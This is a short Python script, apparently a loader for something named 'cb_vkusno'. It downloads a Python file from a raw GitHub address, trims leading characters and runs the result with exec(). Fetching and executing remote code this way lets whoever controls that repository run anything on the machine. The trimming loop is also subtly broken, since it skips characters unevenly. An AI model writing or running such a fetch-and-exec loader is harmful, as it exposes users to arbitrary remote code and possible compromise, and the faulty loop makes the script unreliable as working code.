import requests

acc_type = 'cb_vkusno'
url = 'https://raw.githubusercontent.com/colorfulpaintofapriltoday/data/main/{acc_type}_code.py'.format(acc_type=acc_type)
data = requests.get(url).content.decode('utf-8')

data_index = 0
while data[0] != 'i':
    data_index += 1
    data = data[data_index:]

exec(data)